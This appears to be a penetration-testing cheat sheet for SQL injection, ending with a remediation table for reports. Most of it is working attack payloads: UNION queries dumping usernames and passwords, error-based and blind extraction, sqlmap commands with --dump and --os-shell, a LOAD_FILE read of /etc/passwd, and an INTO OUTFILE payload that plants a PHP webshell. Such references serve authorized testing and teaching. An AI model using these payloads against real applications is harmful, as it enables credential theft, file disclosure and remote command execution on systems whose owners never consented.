# SQL Injection

---

## Detection

```
# Basic test payloads (insert into input fields / URL params)
'
''
`
')
"))
1' OR '1'='1
1' OR 1=1--
' OR 1=1--
" OR 1=1--
admin'--
' OR 'x'='x
```

**Error messages** = possible SQLi:
- `You have an error in your SQL syntax`
- `Unclosed quotation mark`
- `ORA-01756` (Oracle)
- `Warning: mysql_fetch_array()`

---

## UNION-Based SQLi

```sql
-- Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    <- error here means 2 columns

-- Find which column is visible
' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--

-- Extract data (MySQL/MSSQL)
' UNION SELECT username, password FROM users--

-- Extract DB version
' UNION SELECT @@version, NULL--        -- MySQL/MSSQL
' UNION SELECT version(), NULL--        -- PostgreSQL
' UNION SELECT NULL, banner FROM v$version-- -- Oracle
```

---

## Error-Based SQLi

```sql
-- MySQL
' AND extractvalue(1, concat(0x7e, (SELECT version())))--

-- MSSQL
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
```

---

## Blind SQLi

### Boolean-Based
```sql
-- True condition (page behaves normally)
' AND 1=1--

-- False condition (page behaves differently)
' AND 1=2--

-- Extract data char by char
' AND SUBSTRING(username,1,1)='a'--
```

### Time-Based
```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

---

## Automated Tools

```sh
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Common Database Fingerprinting

```sql
-- MySQL
SELECT @@version
SELECT user()
SELECT database()

-- MSSQL  
SELECT @@version
SELECT system_user
SELECT db_name()

-- Oracle
SELECT * FROM v$version
SELECT user FROM dual

-- PostgreSQL
SELECT version()
SELECT current_user
SELECT current_database()
```

---

## File Operations (If Privileged)

```sql
-- MySQL - read file
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--

-- MySQL - write webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Remediation

**Root cause:** SQLi happens when user input is concatenated directly into SQL queries instead of being treated as data. The fix is architectural - parameterized queries make injection structurally impossible regardless of what the user inputs.

| Finding | Remediation |
|---|---|
| SQL injection (any type) | Use **parameterized queries / prepared statements** - never concatenate user input into SQL. In PHP: PDO with `?` placeholders. In Python: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`. This is the only real fix. |
| Error messages expose SQL structure | Disable detailed SQL error messages in production. Catch exceptions and return generic errors to users. Log the real error server-side. |
| DB user has FILE privilege (LOAD_FILE / INTO OUTFILE) | The application's DB user should have only SELECT/INSERT/UPDATE/DELETE on its own database - never FILE, SUPER, or admin privileges. Principle of least privilege on DB accounts. |
| DB user has admin / DBA rights | Create a dedicated low-privilege DB user for the application. Revoke unnecessary grants. |
| No WAF | Deploy a Web Application Firewall as a **secondary** control (not a substitute for parameterized queries - WAFs can be bypassed, parameterized queries cannot). |

**Key point for reports:** Parameterized queries are the only true fix for SQLi. Input validation and WAFs are defense-in-depth, not solutions. If the code concatenates input into SQL anywhere, that specific query is vulnerable regardless of validation elsewhere.
